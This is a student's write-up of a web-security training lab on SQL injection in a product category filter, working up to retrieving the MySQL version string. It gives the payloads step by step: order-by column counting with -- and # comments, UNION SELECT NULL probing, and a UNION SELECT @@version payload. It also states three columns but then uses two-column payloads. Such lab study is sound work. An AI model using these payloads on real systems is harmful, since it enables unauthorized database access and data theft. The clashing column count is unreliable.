# Fifth Lab: SQL Injection

Lab - 05 : SQL injection attack, querying the database type and version on MySQL and Microsoft 

SQL Injection :  Product category filter

End Goal : Display the database version string

Analysis : 

1. SQl injection issues using ‘ → True
2. To output data from the database 
    1. Determine the number of columns
        
        ```
        Payload -> ' order by 1--
        ```
        
        ![vmplayer_hMUSuHVCHK.png](Fifth%20Lab%20SQL%20Injection%2021a3c5d54c7680b3ab85d05e4aafbefc/vmplayer_hMUSuHVCHK.png)
        
        For some reason, the payload gave this result.  I reasearched and found out that sometimes in 
        
        ```
        Payload -> ' order by 1--
        ```
        
        It does not like the (- -) characters which may give the internal server error. So, use this payload which does the same thing too, it comments out too like the ( - - ). 
        
        ```
        Payload -> ' order by 1#
        ```
        
        ![vmplayer_uNMslGoiPl.png](Fifth%20Lab%20SQL%20Injection%2021a3c5d54c7680b3ab85d05e4aafbefc/vmplayer_uNMslGoiPl.png)
        
        Now this works….. 😁
        
        Now lets increase the number and find out the number of columns. 
        
        No of columns = 3
        
        ### Note: Another way to find out the number of columns
        
        - way
            
            ```
            Payload -> ' UNION SELECT NULL, NULL#
            ```
            
            Keep sending the payload by increasing a null until u get the internal server error
            
    2. Determine the database type of column
        
        ```
        Payload -> ' UNION SELECT 'abc', 'def'#
        ```
        
        If this does not return any error then, both are string types.
        
    3. Determining the version of the database
        
        ```
        Payload -> ' UNION SELECT @@version, NULL#
        ```
        
        ![vmplayer_0K7KaR9LFk.png](Fifth%20Lab%20SQL%20Injection%2021a3c5d54c7680b3ab85d05e4aafbefc/vmplayer_0K7KaR9LFk.png)